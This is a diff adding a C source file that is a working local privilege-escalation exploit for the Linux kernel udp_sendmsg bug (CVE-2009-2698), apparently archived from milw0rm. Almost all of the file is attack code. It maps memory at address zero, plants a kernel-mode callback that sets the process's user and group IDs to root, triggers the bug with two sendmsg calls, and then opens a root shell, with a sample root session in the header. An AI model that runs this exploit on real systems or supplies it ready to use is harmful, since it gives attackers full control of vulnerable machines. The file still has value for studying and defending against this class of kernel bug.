@@ -1,0 +1,208 @@
+/***********************************************************
+ * hoagie_udp_sendmsg.c
+ * LOCAL LINUX KERNEL ROOT EXPLOIT (< 2.6.19) - CVE-2009-2698
+ *
+ * udp_sendmsg bug exploit via (*output) callback function
+ * used in dst_entry / rtable
+ *
+ * Bug reported by Tavis Ormandy and Julien Tinnes 
+ * of the Google Security Team
+ *
+ * Tested with Debian Etch (r0)
+ *
+ * $ cat /etc/debian_version
+ * 4.0
+ * $ uname -a
+ * Linux debian 2.6.18-4-686 #1 SMP Mon Mar 26 17:17:36 UTC 2007 i686 GNU/Linux
+ * $ gcc hoagie_udp_sendmsg.c -o hoagie_udp_sendmsg
+ * $ ./hoagie_udp_sendmsg
+ * hoagie_udp_sendmsg.c - linux root < 2.6.19 local
+ * -andi / void.at
+ *
+ * sh-3.1# id
+ * uid=0(root) gid=0(root) Gruppen=20(dialout),24(cdrom),25(floppy),29(audio),44(video),46(plugdev),1000(andi)
+ * sh-3.1#
+ *
+ * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
+ * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
+ * DAMAGE DONE USING THIS PROGRAM.
+ *
+ * VOID.AT Security
+ * andi@void.at
+ * http://www.void.at
+ *
+ ************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <sys/mman.h>
+
+/**
+ * this code will be called from NF_HOOK via (*output) callback in kernel mode
+ */
+void set_current_task_uids_gids_to_zero() {
+   asm("push %eax\n"
+       "movl $0xffffe000, %eax\n"
+       "andl %esp, %eax\n"
+       "movl (%eax), %eax\n"
+       "movl $0x0, 0x150(%eax)\n"
+       "movl $0x0, 0x154(%eax)\n"
+       "movl $0x0, 0x158(%eax)\n"
+       "movl $0x0, 0x15a(%eax)\n"
+       "movl $0x0, 0x160(%eax)\n"
+       "movl $0x0, 0x164(%eax)\n"
+       "movl $0x0, 0x168(%eax)\n"
+       "movl $0x0, 0x16a(%eax)\n"
+       "pop  %eax\n");
+}
+
+int main(int argc, char **argv) {
+   int s;
+   struct msghdr header;
+   struct sockaddr_in sin;
+   char *rtable = NULL;
+
+   fprintf(stderr,
+           "hoagie_udp_sendmsg.c - linux root <= 2.6.19 local\n"
+	              "-andi / void.at\n\n");
+
+   s = socket(PF_INET, SOCK_DGRAM, 0);
+   if (s == -1) {
+      fprintf(stderr, "[*] can't create socket\n");
+      exit(-1);
+   }
+
+   /**
+    * initialize required variables
+    */
+   memset(&header, 0, sizeof(struct msghdr));
+   memset(&sin, 0, sizeof(struct sockaddr_in));
+   sin.sin_family = AF_INET;
+   sin.sin_addr.s_addr = inet_addr("127.0.0.1");
+   sin.sin_port = htons(22);
+   header.msg_name = &sin;
+   header.msg_namelen = sizeof(sin);
+
+   /**
+    * and this is the trick:
+    * we can use (*output)(struct sk_buff*) from dst_entry (used by rtable) as a callback (=> offset 0x74)
+    * so we map our rtable buffer at offset 0 and set output callback function
+    *
+    * struct dst_entry
+    * {
+    *         struct dst_entry        *next;
+    *         atomic_t                __refcnt;       client references
+    *         int                     __use;
+    *         struct dst_entry        *child;
+    *         struct net_device       *dev;
+    *         short                   error;
+    *         short                   obsolete;
+    *         int                     flags;
+    * #define DST_HOST                1
+    * #define DST_NOXFRM              2
+    * #define DST_NOPOLICY            4
+    * #define DST_NOHASH              8
+    * #define DST_BALANCED            0x10
+    *         unsigned long           lastuse;
+    *         unsigned long           expires;
+    * 
+    *         unsigned short          header_len;     * more space at head required *
+    *         unsigned short          trailer_len;    * space to reserve at tail *
+    * 
+    *         u32                     metrics[RTAX_MAX];
+    *         struct dst_entry        *path;
+    * 
+    *         unsigned long           rate_last;      * rate limiting for ICMP *
+    *         unsigned long           rate_tokens;
+    * 
+    *         struct neighbour        *neighbour;
+    *         struct hh_cache         *hh;
+    *         struct xfrm_state       *xfrm;
+    * 
+    *         int                     (*input)(struct sk_buff*);
+    *         int                     (*output)(struct sk_buff*);
+    * 
+    * #ifdef CONFIG_NET_CLS_ROUTE
+    *         __u32                   tclassid;
+    * #endif
+    * 
+    *         struct  dst_ops         *ops;
+    *         struct rcu_head         rcu_head;
+    * 
+    *         char                    info[0];
+    * };
+    *
+    * struct rtable
+    * {
+    *         union
+    *         {
+    *                 struct dst_entry        dst;
+    *                 struct rtable           *rt_next;
+    *         } u;
+    *
+    *         struct in_device        *idev;
+    *
+    *         unsigned                rt_flags;
+    *         __u16                   rt_type;
+    *         __u16                   rt_multipath_alg;
+    *
+    *         __be32                  rt_dst; * Path destination     *
+    *         __be32                  rt_src; * Path source          *
+    *         int                     rt_iif;
+    *
+    *         * Info on neighbour *
+    *         __be32                  rt_gateway;
+    *
+    *         * Cache lookup keys *
+    *         struct flowi            fl;
+    *
+    *         * Miscellaneous cached information *
+    *          __be32                  rt_spec_dst; * RFC1122 specific destination *
+    *         struct inet_peer        *peer; * long-living peer info *
+    * };
+    *
+    */
+   rtable = mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
+   if (rtable == MAP_FAILED) {
+      fprintf(stderr, "[*] mmap failed\n");
+      exit(-1);
+   }
+   *(int *)(rtable + 0x74) = (int)set_current_task_uids_gids_to_zero;
+
+   /* trigger exploit
+    *
+    * the second sendmsg() call will call ip_append_data() with rt == NULL
+    * because of:
+    * if (up->pending) {
+    *          *
+    *          * There are pending frames.
+    *          * The socket lock must be held while it's corked.
+    *          *
+    *          lock_sock(sk);
+    *          if (likely(up->pending)) {
+    *                    if (unlikely(up->pending != AF_INET)) {
+    *                            release_sock(sk);
+    *                            return -EINVAL;
+    *                    }
+    *                    goto do_append_data;
+    *            }
+    *            release_sock(sk);
+    *    }
+    *
+    */
+   sendmsg(s, &header, MSG_MORE|MSG_PROXY);
+   sendmsg(s, &header, 0);
+
+   close(s);
+
+   system("/bin/sh");
+
+   return 0;
+}
+
+// milw0rm.com [2009-09-02]
